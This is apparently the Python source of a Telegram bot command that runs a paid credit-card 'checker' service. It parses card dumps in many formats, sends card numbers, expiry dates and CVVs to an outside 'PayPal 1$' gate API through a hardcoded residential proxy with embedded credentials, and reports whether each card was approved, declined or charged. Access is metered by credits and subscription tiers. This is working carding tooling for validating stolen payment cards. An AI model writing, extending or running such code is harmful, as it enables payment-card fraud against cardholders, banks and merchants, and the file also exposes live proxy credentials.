import re
import logging
import random
import json
from typing import Optional
from bin import get_bin_info
from database import get_or_create_user, update_user_credits, get_user_credits
from plans import get_user_current_tier
from datetime import datetime, timedelta
import asyncio
import aiohttp

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# API endpoint - Changed to HTTP as per your example
API_BASE_URL = "http://paypal1.nikhilkhokhar.com"

# Proxy Configuration
# Using the specific proxy string you provided in the example
PROXY_STRING = "http://user-FG9IqFSVPYNRnxxV-type-residential-session-c3ngj9de-country-US-city-Albuquerque-rotation-5:RCMd2xUcgo5Swkxo@geo.g-w.info:10080"

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def parse_card_details(card_string: str) -> Optional[tuple]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: 4169161410569379/12|16|931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379/12|16/931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379/12/16/931
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379|12/16|931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379|12/16/931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12|16|931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379:12|16/931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12/16|931
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Pattern: 4169161410569379/12|16|931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379/12|16/931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379/12/16/931
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379|12/16|931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12|16|931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379:12|16/931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12/16|931
        r'(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

async def check_card_paypal(card_details: str, user_info: dict) -> Optional[str]:
    """
    Check card details using PayPal 1$ API asynchronously with aiohttp.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /pp card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN information using imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    # Construct API URL
    # Proxy is passed as a QUERY PARAMETER for the API to use internally.
    # The bot connects DIRECTLY to the API (no proxy argument in session.get).
    card_string = f"{card_number}|{month}|{year}|{cvv}"
    
    # Encode the proxy string for URL safety (optional but good practice)
    from urllib.parse import quote
    safe_proxy_string = quote(PROXY_STRING, safe='')
    
    api_url = f"{API_BASE_URL}/gate=pp1/cc={card_string}?proxy={safe_proxy_string}"
    
    # Retry configuration
    max_retries = 3
    retry_delay = 2  # seconds
    
    for attempt in range(max_retries):
        try:
            # Create an aiohttp session
            async with aiohttp.ClientSession() as session:
                # Make API request asynchronously WITHOUT passing a proxy argument
                # This fixes the "Server disconnected" error.
                async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=50)) as response:
                    # Check for 500 error specifically
                    if response.status == 500:
                        if attempt < max_retries - 1:  # Don't sleep on the last attempt
                            await asyncio.sleep(retry_delay * (attempt + 1))  # Exponential backoff
                            continue
                        else:
                            # All retries failed, return generic error
                            return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
                    
                    response.raise_for_status()
                    api_response = await response.json()
            
            # Format and return response
            return format_response_paypal(api_response, user_info, card_details, brand, issuer, country_name, country_flag)
        
        except aiohttp.ClientConnectorError as e:
            # Connection errors (DNS, Refused, Disconnected)
            logger.error(f"Connection error checking card: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(retry_delay * (attempt + 1))
                continue
            else:
                return "⚠️ <b>Connection to API failed. Please try again later.</b>"
                
        except aiohttp.ClientError as e:
            logger.error(f"HTTP error checking card with PayPal 1$: {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(retry_delay * (attempt + 1))
                continue
            else:
                # All retries failed, return generic error without leaking API details
                return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
        
        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error checking card with PayPal 1$: {e}")
            return "⚠️ <b>An error occurred while processing the response.</b>\n\n<i>Please try again later.</i>"
        
        except Exception as e:
            logger.error(f"Unexpected error checking card with PayPal 1$: {e}")
            # Don't expose the actual error to the user
            return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
    
    # This should never be reached, but just in case
    return "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"

def format_response_paypal(api_response: dict, user_info: dict, card_details: str, 
                           brand: str, issuer: str, country_name: str, country_flag: str) -> str:
    """
    Format API response into a beautiful message with emojis for PayPal 1$.
    
    Args:
        api_response: Dictionary containing API response
        user_info: Dictionary containing user information
        card_details: Full card details string
        brand: Card brand from BIN lookup
        issuer: Bank name from BIN lookup
        country_name: Country name from BIN lookup
        country_flag: Country emoji from BIN lookup
        
    Returns:
        Formatted string with emojis
    """
    # Extract response fields
    code = api_response.get("code", "")
    message = api_response.get("message", "")
    status = api_response.get("status", "")
    
    # Determine response text based on code
    if code == "CARD_GENERIC_ERROR":
        response_text = "ISSUER_DECLINE"
    else:
        response_text = code
    
    # Determine status style based on status content
    status_lower = status.lower()
    if "approved" in status_lower:
        status_style = "<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿</b> ✅"
    elif "declined" in status_lower:
        status_style = "<b>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</b> ❌"
    else:
        status_style = "<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> 🔥"
    
    # Get user info
    user_id = user_info.get("id", "Unknown")
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Get user credits and format display
    user_credits = get_user_credits(user_id)
    if user_credits is None:
        credits_display = "Error"
    elif user_credits == float('inf'):
        credits_display = "Infinite😎"  # Display for unlimited credits
    else:
        credits_display = str(user_credits)

    # Create user link with profile name hyperlinked (as requested)
    user_link = f"<a href='tg://user?id={user_id}'>{first_name}</a> <code>[{user_tier}]</code>"
    
    # Format response with exact structure requested
    status_part = f"""<pre><a href='https://t.me/farxxes'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ {status_style}</pre>"""
    
    bank_part = f"""<pre><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ <code>{brand}</code>
<b>𝑩𝒂𝒏𝒌</b> ↬ <code>{issuer}</code>
<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ <code>{country_name} {country_flag}</code></pre>"""
    
    card_part = f"""<a href='https://t.me/farxxes'>⊀</a> <b>𝐂𝐚𝐫𝐝</b>
⤷ <code>{card_details}</code>"""
    
    # Combine all parts
    formatted_response = f"""{status_part}
{card_part}
<a href='https://t.me/farxxes'>⊀</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ↬ <i>𝗣𝗮𝘆𝗽𝗮𝗹 1$</i>
<a href='https://t.me/farxxes'>⊀</a> <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ↬ <code>{response_text}</code>
{bank_part}
<a href='https://t.me/farxxes'>⌬</a> <b>𝐔𝐬𝐞𝐫</b> ↬ {user_link} 
<a href='https://t.me/farxxes'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/farxxes'>kคli liຖนxx</a>"""
    
    return formatted_response

# This function will be called from main.py
async def handle_pp_command(update, context):
    """
    Handle the /pp command with user-specific cooldown for Trial users.
    Can also be used as a reply to a message containing card details.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Free users (user-specific)
    current_time = datetime.now()
    
    # Apply cooldown to both Trial and Free users
    if user_tier in ["Trial", "Free"] and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Try to get card details from command arguments
    card_details = None
    
    # First check if arguments are provided
    if context.args:
        card_details = " ".join(context.args)
    # If no arguments, check if this is a reply to a message
    elif update.message.reply_to_message:
        # Try to extract card details from the replied message
        replied_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        card_details = extract_card_from_text(replied_text)
    
    # If still no card details, show usage
    if not card_details:
        await update.message.reply_text(
            "⚠️ <b>Missing card details!</b>\n\n"
            "<i>Usage 1: /pp card|mm|yy|cvv</i>\n"
            "<i>Usage 2: Reply to a message containing card details with /pp</i>", 
            parse_mode="HTML"
        )
        return
    
    # Get user credits BEFORE processing the card
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # If user has no credits (and not unlimited), show warning and stop
    if not has_credits:
        await update.message.reply_text(
            f"""<a href='https://t.me/farxxes'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left.</i>

<a href='https://t.me/farxxes'>💳</a> <b>Please recharge to continue using this service.</b>

<a href='https://t.me/farxxes'>📊</a> <b>Current Plan:</b> <code>{user_tier}</code>
<a href='https://t.me/farxxes'>💰</a> <b>Credits:</b> <code>0</code>""",
            parse_mode="HTML"
        )
        return
    
    # Create progress message
    progress_msg = f"""<pre>🔄 <b>𝗣𝗿𝗼𝗰𝗲𝘀𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁...</b></pre>
<pre>{card_details}</pre>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬ <i>𝗣𝗮𝘆𝗽𝗮𝗹 1$</i>"""
    
    # Send the progress message
    checking_message = await update.message.reply_text(progress_msg, parse_mode="HTML")
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Update the last command time for Free/Trial users immediately
    if user_tier in ["Trial", "Free"]:
        last_command_time[user_id] = current_time
    
    # Create a background task for the card check to avoid blocking
    async def background_check():
        try:
            # Run the asynchronous card check
            result = await check_card_paypal(card_details, user_info)
            
            # Deduct 1 credit if the response was successful and user doesn't have unlimited credits
            if result and not result.startswith("⚠️ <b>Missing card details!</b>") and not result.startswith("⚠️ <b>An error occurred"):
                # Only deduct credits if the user doesn't have unlimited
                if not is_unlimited:
                    # Deduct 1 credit in the background
                    update_user_credits(user_id, -1)
                    
                    # Get updated credits for the response
                    updated_credits = get_user_credits(user_id)
                    
                    # Add warning if credits are now 0
                    if updated_credits is not None and updated_credits <= 0:
                        # Add warning message at the end of the result
                        result = result + f"\n\n<a href='https://t.me/abtlnx'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙞𝙣𝙜:</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>"
            
            # Edit the checking message with the result
            await checking_message.edit_text(result, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Error in background check: {e}")
            # Don't expose the actual error to the user
            error_msg = "⚠️ <b>An error occurred while checking the card.</b>\n\n<i>Please try again later.</i>"
            await checking_message.edit_text(error_msg, parse_mode="HTML")
    
    # Schedule the background task without awaiting it to avoid blocking
    asyncio.create_task(background_check())

if __name__ == "__main__":
    # For testing purposes
    test_card = "4553570612769104|04|2026|731"
    test_user = {
        "id": 123456789,
        "username": "testuser",
        "first_name": "Test"
    }
    asyncio.run(check_card_paypal(test_card, test_user))
